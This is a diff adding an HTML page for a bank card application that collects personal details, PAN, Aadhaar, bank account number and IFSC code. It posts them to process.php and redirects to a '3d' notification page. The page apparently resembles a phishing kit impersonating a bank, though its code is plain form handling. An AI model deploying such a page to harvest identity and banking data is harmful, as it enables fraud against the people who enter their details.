@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alliance Corporation Bank Card Application</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f8f9fa;
+            text-align: center;
+        }
+        .container {
+            width: 50%;
+            margin: auto;
+            padding: 20px;
+        }
+        .steps {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .step {
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 16px;
+            color: #005ca9;
+            border: 1px solid #005ca9;
+            margin-right: 5px;
+            background-color: white;
+        }
+        .active {
+            background-color: #005ca9;
+            color: white;
+        }
+        .form-container {
+            background: #e7f3ff;
+            padding: 20px;
+            border-radius: 10px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        label {
+            font-weight: bold;
+        }
+        input, select {
+            width: 95%;
+            padding: 8px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        .btn {
+            background: #005ca9;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 25px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        #success-message {
+            display: none;
+            font-size: 18px;
+            color: green;
+            margin-top: 20px;
+        }
+        body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background: url('images/image.png') no-repeat center center fixed;
+    background-size: cover;
+    text-align: center;
+}
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="steps">
+            <div class="step active" id="step1-tab">Personal Details</div>
+            <div class="step" id="step2-tab">Confirm Details</div>
+            <div class="step" id="step3-tab">Choose Card</div>
+        </div>
+
+        <form id="cardForm">
+            <!-- Step 1: Personal Details -->
+            <div class="form-container" id="step1">
+                <div class="input-group">
+                    <label>Full Name:</label>
+                    <input type="text" name="fullname" required>
+                </div>
+                <div class="input-group">
+                    <label>Email:</label>
+                    <input type="email" name="email" required>
+                </div>
+                <div class="input-group">
+                    <label>Phone Number:</label>
+                    <input type="text" name="phone" required>
+                </div>
+                <div class="input-group">
+                    <label>Date of Birth:</label>
+                    <input type="date" name="dob" required>
+                </div>
+                <div class="input-group">
+                    <label>Profession:</label>
+                    <select name="Profession" required>
+                        <option value="">Select Profession</option>
+                        <option value="Job">Job</option>
+                        <option value="Business">Business</option>
+                        <option value="Student">Student</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label>Address:</label>
+                    <input type="text" name="address" required>
+                </div>
+                <div class="input-group">
+                    <label>City:</label>
+                    <input type="text" name="city" required>
+                </div>
+                <div class="input-group">
+                    <label>State:</label>
+                    <input type="text" name="state" required>
+                </div>
+                <div class="input-group">
+                    <label>Country:</label>
+                    <input type="text" name="country" required>
+                </div>
+                <button type="button" class="btn" onclick="validateStep(1, 2)">Next</button>
+            </div>
+
+            <!-- Step 2: Confirm Details -->
+            <div class="form-container" id="step2" style="display: none;">
+                <div class="input-group">
+                    <label>PAN Number:</label>
+                    <input type="text" name="pan" required>
+                </div>
+                <div class="input-group">
+                    <label>Aadhaar Number:</label>
+                    <input type="text" name="aadhaar" required>
+                </div>
+                <div class="input-group">
+                    <label>Bank Account Number:</label>
+                    <input type="text" name="account" required>
+                </div>
+                <div class="input-group">
+                    <label>IFSC Code:</label>
+                    <input type="text" name="ifsc" required>
+                </div>
+                <button type="button" class="btn" onclick="validateStep(2, 3)">Next</button>
+            </div>
+
+             <!-- Step 3: Choose Card -->
+             <div class="form-container" id="step3" style="display: none;">
+                <div class="input-group">
+                    <label>Select Card Type:</label>
+                    <select name="card_type" id="cardType" required onchange="updateCardOptions()">
+                        <option value="">Select Card Type</option>
+                        <option value="Rewards">Rewards</option>
+                        <option value="Travel">Travel</option>
+                        <option value="Shopping">Shopping</option>
+                        <option value="Fuel">Fuel</option>
+                        <option value="Business">Business</option>
+                    </select>
+                </div>
+
+                <div class="input-group">
+                    <label>Select Card:</label>
+                    <select name="card_name" id="cardName" required>
+                        <option value="">Select a Card</option>
+                    </select>
+                </div>
+
+                <button type="submit" class="btn">Apply</button>
+            </div>
+        </form>
+
+        <p id="success-message">Applied successfully for your new credit card!</p>
+    </div>
+
+    <footer style="background: #005ca9; color: white; padding: 15px; text-align: center;">
+        <p>&copy; 2025 Alliance Corporation Bank | 
+            <a href="terms.html" style="color: white; text-decoration: none;">Terms & Conditions</a> | 
+            <a href="privacy.html" style="color: white; text-decoration: none;">Privacy Policy</a>
+        </p>
+    </footer>
+
+    <script>
+       function validateStep(currentStep, nextStep) {
+    let stepDiv = document.getElementById(`step${currentStep}`);
+    let inputs = stepDiv.querySelectorAll("input, select");
+    let valid = true;
+
+    inputs.forEach(input => {
+        let value = input.value.trim();
+        let fieldName = input.name;
+        let regex;
+
+        if (fieldName === "pan") {
+            regex = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/;
+            if (!regex.test(value)) {
+                alert("Invalid PAN Number. Format should be: AAAAA1234A");
+                valid = false;
+            }
+        } 
+        else if (fieldName === "aadhaar") {
+            regex = /^[0-9]{12}$/;
+            if (!regex.test(value)) {
+                alert("Invalid Aadhaar Number. It must be a 12-digit number.");
+                valid = false;
+            }
+        }
+        else if (fieldName === "account") {
+            regex = /^[0-9]{9,18}$/;
+            if (!regex.test(value)) {
+                alert("Invalid Bank Account Number. It should be between 9 to 18 digits.");
+                valid = false;
+            }
+        }
+        else if (fieldName === "ifsc") {
+            regex = /^[A-Z]{4}0[0-9]{6}$/;
+            if (!regex.test(value)) {
+                alert("Invalid IFSC Code. Format should be: AAAA0123456");
+                valid = false;
+            }
+        }
+
+        if (!value) {
+            valid = false;
+            input.style.border = "1px solid red";
+        } else {
+            input.style.border = "1px solid #ccc";
+        }
+    });
+
+    if (valid) {
+        document.getElementById(`step${currentStep}`).style.display = "none";
+        document.getElementById(`step${nextStep}`).style.display = "block";
+        document.getElementById(`step${currentStep}-tab`).classList.remove("active");
+        document.getElementById(`step${nextStep}-tab`).classList.add("active");
+    } else {
+        alert("Please correct the errors before proceeding.");
+    }
+}
+
+
+        const cardsData = {
+            Rewards: ["Classic", "Premium", "Gold", "Platinum", "Exclusive"],
+            Travel: ["Explorer", "JetSetter", "Premium", "Elite", "Business"],
+            Shopping: ["Shopper", "VIP", "Discount", "Cashback", "Exclusive"],
+            Fuel: ["FuelPlus", "Drive", "AutoGold", "Prime", "FuelSaver"],
+            Business: ["Standard", "Corporate", "Gold", "Platinum", "Elite"]
+        };
+
+        function updateCardOptions() {
+            const cardType = document.getElementById("cardType").value;
+            const cardNameDropdown = document.getElementById("cardName");
+            
+            cardNameDropdown.innerHTML = '<option value="">Select a Card</option>';
+
+            if (cardType && cardsData[cardType]) {
+                cardsData[cardType].forEach(card => {
+                    let option = document.createElement("option");
+                    option.value = card;
+                    option.textContent = card;
+                    cardNameDropdown.appendChild(option);
+                });
+            }
+        }
+
+
+        document.getElementById("cardForm").addEventListener("submit", function (e) {
+            e.preventDefault();
+            let formData = new FormData(this);
+
+            fetch("process.php", {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                if (data.trim() === "success") {
+                    document.getElementById("success-message").style.display = "block";
+                    this.reset();
+                    setTimeout(() => {
+                        window.location.href = "notification3d.html"; // Redirects to notification.html
+                    }, 1);
+                } else {
+                    alert("Error: " + data);
+                }
+            })
+            .catch(error => console.error("Error:", error));
+        });
+    </script>
+</body>
+</html>
